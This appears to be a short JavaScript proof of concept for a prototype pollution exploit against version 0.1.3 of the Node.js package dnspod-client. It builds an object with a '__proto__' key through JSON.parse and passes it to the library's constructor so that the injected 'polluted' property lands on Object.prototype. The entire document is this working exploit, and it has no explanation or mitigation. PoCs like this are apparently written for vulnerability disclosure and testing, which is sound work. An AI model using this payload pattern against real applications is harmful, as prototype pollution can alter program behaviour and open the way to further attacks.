const Dnspod = require('./dnspod-client@0.1.3')
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

new Dnspod(payload);